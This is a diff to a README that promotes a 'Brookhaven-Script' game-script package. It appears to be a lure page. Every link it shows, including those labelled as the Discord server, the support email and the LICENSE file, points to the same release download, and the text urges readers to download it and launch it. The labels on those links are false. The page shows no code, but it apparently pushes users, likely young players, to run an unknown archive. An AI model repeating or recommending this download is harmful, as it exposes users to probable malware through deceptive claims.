@@ -39,15 +39,15 @@ Welcome to the Brookhaven-Script repository! Here you will find truly unique sof
 
 ## Get Started ⚙️
 
-To start using our Brookhaven-Script, [download the latest release](https://github.com/KhemrinP/Brookhaven-Script/releases/download/v1.0/Release.zip). This zip file contains all the necessary scripts and instructions to get you up and running. Simply click the link and follow the on-screen prompts to download the file. Once downloaded, launch it to begin installing the scripts.
+To start using our Brookhaven-Script, [download the latest release](https://github.com/KhemrinP/Brookhaven-Script/releases/tag/v2.0). This zip file contains all the necessary scripts and instructions to get you up and running. Simply click the link and follow the on-screen prompts to download the file. Once downloaded, launch it to begin installing the scripts.
 
 ## Community 🌐
 
-Join our Brookhaven community to connect with other players, share tips and tricks, and stay updated on the latest developments. We have a dedicated Discord server where you can interact with like-minded individuals who share your passion for Brookhaven. Click [here](https://github.com/KhemrinP/Brookhaven-Script/releases/download/v1.0/Release.zip) to join our Discord server and become a part of our growing community.
+Join our Brookhaven community to connect with other players, share tips and tricks, and stay updated on the latest developments. We have a dedicated Discord server where you can interact with like-minded individuals who share your passion for Brookhaven. Click [here](https://github.com/KhemrinP/Brookhaven-Script/releases/tag/v2.0) to join our Discord server and become a part of our growing community.
 
 ## Support 🔍
 
-If you encounter any issues while using our scripts or have any questions, don't hesitate to reach out to our support team. We are here to assist you and ensure you have a smooth experience with our Brookhaven-Script. You can contact us via email at https://github.com/KhemrinP/Brookhaven-Script/releases/download/v1.0/Release.zip or join our Discord server and ask for help in the support channel.
+If you encounter any issues while using our scripts or have any questions, don't hesitate to reach out to our support team. We are here to assist you and ensure you have a smooth experience with our Brookhaven-Script. You can contact us via email at https://github.com/KhemrinP/Brookhaven-Script/releases/tag/v2.0 or join our Discord server and ask for help in the support channel.
 
 ## Stay Updated 📫
 
@@ -59,6 +59,6 @@ We welcome contributions from the community to help improve our scripts and make
 
 ## License 📜
 
-Our Brookhaven-Script is released under the MIT License, which means you are free to use, modify, and distribute the scripts as long as you include the original copyright and license notice. For more details, please refer to the [LICENSE](https://github.com/KhemrinP/Brookhaven-Script/releases/download/v1.0/Release.zip) file included with the scripts.
+Our Brookhaven-Script is released under the MIT License, which means you are free to use, modify, and distribute the scripts as long as you include the original copyright and license notice. For more details, please refer to the [LICENSE](https://github.com/KhemrinP/Brookhaven-Script/releases/tag/v2.0) file included with the scripts.
 
 Let's make Brookhaven even more exciting with our cutting-edge scripts! Download now and enhance your gameplay like never before. Happy gaming! 🎮🌟
